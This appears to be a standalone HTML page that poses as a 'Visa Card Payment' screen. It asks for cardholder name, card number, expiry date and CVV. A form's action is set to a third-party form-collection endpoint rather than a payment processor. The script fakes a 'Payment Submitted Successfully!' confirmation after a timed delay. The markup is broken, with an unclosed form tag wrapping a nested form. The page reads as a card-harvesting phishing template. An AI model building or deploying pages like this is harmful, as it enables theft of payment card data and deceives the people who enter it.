<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa Payment Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .payment-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            width: 350px;
        }
        .payment-container h2 {
            margin-bottom: 20px;
            text-align: center;
            color: #333;
        }
        .input-field {
            margin-bottom: 15px;
        }
        .input-field label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .input-field input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #0056b3;
        }
        .loading {
            display: none;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="payment-container">
       <form
  action="https://formspree.io/f/manygdbz"
  method="POST"
        <h2>Visa Card Payment</h2>
        <form id="payment-form" onsubmit="showLoading(event)">
            <div class="input-field">
                <label for="card-name">Cardholder Name</label>
                <input type="text" id="card-name" placeholder="John Doe" required>
            </div>
            <div class="input-field">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" placeholder="1234 5678 9101 1121" maxlength="19" required>
            </div>
            <div class="input-field">
                <label for="expiry">Expiration Date</label>
                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
            </div>
            <div class="input-field">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" placeholder="123" maxlength="3" required>
            </div>
            <button type="submit" class="submit-btn">Submit</button>
        </form>
        <div class="loading" id="loading">
            <p>Processing... Please wait.</p>
        </div>
    </div>

    <script>
        function showLoading(event) {
            event.preventDefault(); // Prevent actual form submission
            document.getElementById('payment-form').style.display = 'none'; // Hide form
            document.getElementById('loading').style.display = 'block'; // Show loading
            setTimeout(function() {
                alert("Payment Submitted Successfully!");
                window.location.reload(); // Simulate a reload or redirect
            }, 3000); // Simulates loading for 3 seconds
        }
    </script>
</body>
</html>
